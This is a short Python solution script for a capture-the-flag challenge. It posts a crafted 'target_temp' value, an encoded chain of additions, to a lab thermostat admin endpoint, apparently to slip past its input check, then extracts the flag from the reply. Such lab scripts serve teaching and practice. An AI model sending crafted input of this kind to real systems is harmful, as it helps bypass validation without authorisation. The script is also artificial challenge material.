import subprocess

url = "http://challenge:4000/admin-thermostat-dashboard"
data = "target_temp=5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B5%2B4"

try:
    result = subprocess.run(
        ["curl", "-X", "POST", url, "-d", data],
        check=True,
        text=True,
        capture_output=True
    )
    flag = str(str(result.stdout).split("Fine you win :( ")[1]).split("</p>")[0]
    print(flag)
except subprocess.CalledProcessError as e:
    print("Command failed with return code:", e.returncode)
    print("Error output:", e.stderr)